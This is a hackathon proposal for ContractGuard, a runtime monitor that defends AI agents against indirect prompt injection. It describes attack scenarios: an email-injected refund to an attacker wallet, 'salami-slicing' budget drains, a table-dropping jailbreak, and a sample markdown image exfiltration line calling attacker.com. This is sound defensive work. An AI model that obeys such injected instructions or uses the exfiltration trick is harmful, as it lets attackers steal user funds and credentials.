# Nebius x NVIDIA Global AI Hackathon Proposal: ContractGuard

> **Submission Track:** Coding and Agentic Engineering Track  
> **Secondary Track:** Best Apps and Agents Track  
> **Hackathon Portal:** [Nebius Global AI Hackathon on Devpost](https://nebiusglobalaihackathon.devpost.com/)  
> **Target Cloud & Models:** Nebius Token Factory with NVIDIA Nemotron (70B-Instruct & Mini-4B)

---

## 1. Project Overview & Pitch

### Tagline
**ContractGuard:** The First Autonomous, Dual-End Policy Synthesizer and Runtime Reference Monitor for Safe AI Agents—Powered by NVIDIA Nemotron on Nebius Token Factory.

### The Problem
Autonomous AI agents are being deployed in production for customer support, coding, DevOps, and finance. However, over **70% of state-of-the-art agents fail under indirect prompt injection attacks** (AgentDojo benchmark). Attackers do not need to hack the user's prompt—they hide malicious commands inside external emails, web search results, and customer tickets. When the agent reads this untrusted data, it executes unauthorized tool calls, transfers money to attacker accounts, or exfiltrates confidential credentials.

Existing guardrails (e.g., Llama Guard, input classifiers) fail because:
1. Indirect injections look identical to benign text (zero toxic keywords).
2. Manually writing formal security policies is too difficult for ordinary developers.
3. Classifiers evaluate single turns in isolation, failing to stop multi-step "salami-slicing" budget attacks.

### The Solution
ContractGuard introduces an end-to-end security solution across the developer lifecycle:
1. **Developer End (Phase 1):** An autonomous **Policy Synthesizer Agent powered by NVIDIA Llama-3.1-Nemotron-70B-Instruct** inspects the developer's agent codebase via AST, conducts an intelligent interactive interview, and auto-generates a mathematical security contract (`contracts.yaml`).
2. **Deployment End (Phase 2):** An out-of-band **Runtime Reference Monitor** intercepts proposed tool calls in sub-millisecond time (<1ms) via **Parameter Evidence-Binding** and a **Cumulative Effect Ledger**, with selective semantic verification by **NVIDIA Nemotron-Mini-4B-Instruct**.

---

## 2. NVIDIA & Nebius Integration Architecture

ContractGuard strictly fulfills all hackathon requirements by utilizing **Nebius Token Factory** and **NVIDIA open-source foundation models**:

```
                               ┌────────────────────────────────────────────────────────┐
                               │           NEBIUS TOKEN FACTORY CLOUD                   │
                               │      (api.tokenfactory.nebius.ai/v1)                   │
                               └───────────┬────────────────────────────────┬───────────┘
                                           │                                │
                                           ▼                                ▼
┌──────────────────────────────────────────────────────┐  ┌──────────────────────────────────────────────────────┐
│  NVIDIA Llama-3.1-Nemotron-70B-Instruct              │  │  NVIDIA Nemotron-Mini-4B-Instruct                    │
│                                                      │  │                                                      │
│  Role: Phase 1 Autonomous Policy Synthesizer Agent   │  │  Role: Phase 2 Runtime Semantic Invariant Verifier    │
│  • Dissects complex tool AST signatures & docstrings │  │  • Fast, cost-efficient, sub-200ms latency            │
│  • Conducts intelligent developer security interview │  │  • Validates task-drift on ambiguous tool actions    │
│  • Synthesizes complete, locked contracts.yaml       │  │  • Scans UI markdown text for image exfiltration      │
└──────────────────────────────────────────────────────┘  └──────────────────────────────────────────────────────┘
```

---

## 3. Key Features & Innovations

1. **Zero-Configuration Onboarding for Developers:**
   Developers don't need a PhD in formal verification. Running `contractguard init` scans tools and generates a complete policy in under 2 minutes.
2. **Deterministic Parameter Evidence-Binding (Core Academic Innovation):**
   Sensitive arguments (such as recipient account numbers or refund amounts) are verified against cryptographically tagged origin sources. An untrusted email cannot overwrite a payment destination, stopping context-aware attacks in <1ms.
3. **Cumulative Effect Ledger:**
   Session-wide budget ceilings prevent compositional "salami-slicing" attacks where attackers split unauthorized transactions into multiple small requests.
4. **Markdown UI Exfiltration Defense:**
   Treats user-facing conversational text as an audited tool (`reply_to_user`), blocking hidden image exfiltration exploits (`![data](https://attacker.com/leak)`).

---

## 4. Live Hackathon Demonstration Scenarios

In the demo video and interactive Web Studio, judges can test four live scenarios:

| # | Attack Scenario | Unprotected Agent Outcome | ContractGuard Outcome | Interception Stage | Latency |
|---|---|---|---|---|---|
| 1 | **Indirect Email Injection** (*"Refund $450 to 0xHACKER"*) | **CRITICAL BREACH:** Money transferred to attacker wallet. | **BLOCKED:** Parameter authority violation (`target_account` originated from untrusted email). | Stage 2 (Evidence Guard) | **0.8 ms** |
| 2 | **Salami-Slicing Budget Drain** (*3x $400 transfers*) | **CRITICAL BREACH:** $1,200 drained, bypassing single-call limit of $500. | **BLOCKED:** Cumulative session ceiling ($1,000) breached on step 3. | Stage 2 (Cumulative Ledger) | **0.9 ms** |
| 3 | **Direct Jailbreak** (*"Drop database tables"*) | **CRITICAL BREACH:** Agent executes destructive SQL command. | **BLOCKED:** Tool listed in `denied_tools` policy invariant. | Stage 1 (Fast Boundary) | **0.4 ms** |
| 4 | **UI Markdown Exfiltration** (*Hidden tracking pixel*) | **DATA EXFILTRATION:** Agent prints private credentials in markdown image link. | **BLOCKED:** Semantic verifier detects unauthorized egress channel in UI text. | Stage 3 (Nemotron Verifier) | **140 ms** |

---

## 5. Judging Criteria Alignment

- **Technological Execution & Innovation:** Combines deterministic Information-Flow Control with generative reasoning from two NVIDIA Nemotron models hosted on Nebius Token Factory. Sub-millisecond latency for deterministic rules.
- **Developer Impact (Track Fit):** Perfect for the **Coding & Agentic Engineering Track**—delivers a CLI and drop-in SDK that makes any LangChain, LlamaIndex, or CrewAI agent secure with only two lines of code.
- **Completeness & Polish:** Includes full academic literature grounding (12 papers), mathematical formulation, full Python backend, interactive web UI studio, and live attack test suite.
